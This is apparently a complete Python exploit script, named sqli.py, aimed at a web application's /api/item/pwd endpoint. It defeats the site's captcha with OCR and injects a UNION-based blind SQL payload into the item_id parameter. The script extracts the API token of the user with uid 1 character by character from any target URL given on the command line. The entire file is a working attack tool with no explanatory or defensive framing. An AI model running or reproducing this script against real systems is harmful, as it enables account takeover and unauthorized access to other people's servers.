import requests
import ddddocr
import sys

ocr = ddddocr.DdddOcr(show_ad=False)

if len(sys.argv) < 2:
    print("[+] usage: python3 sqli.py http://target")
    sys.exit()
url = sys.argv[1]
slist = "abcdef1234567890"
token = ""

def ocrimg(img):
    return ocr.classification(img)

def getocrcode():
    create_url = url+'/server/index.php?s=/api/common/createCaptcha'
    show_url = url+'/server/index.php?s=/api/common/showCaptcha&captcha_id='
    id = requests.get(create_url).json()['data']['captcha_id']
    code = ocrimg(requests.get(show_url+id).content)
    return id, code

def sqli(i,s):
    id, code = getocrcode()
    payload = f"1') union select 1,2,3,4,5,substr((select token from user_token where uid=1),{i},1)='{s}',7,8,9,10,11,12--"
    data = {
        "password" : "1",
        "item_id" : payload,
        "captcha" : code,
        "captcha_id" : int(id)
    }
    return requests.post(url+"/server/index.php?s=/api/item/pwd",data)

for i in range(1,65):
    for s in slist:
        while True:
            resp = sqli(i,s)
            if "refer_url" in resp.text:
                token += s
                print("[+]token:",token)
                break
            elif "\"error_code\":10206" in resp.text:
                continue
            else:
                break
        if len(token) == i:
            break
        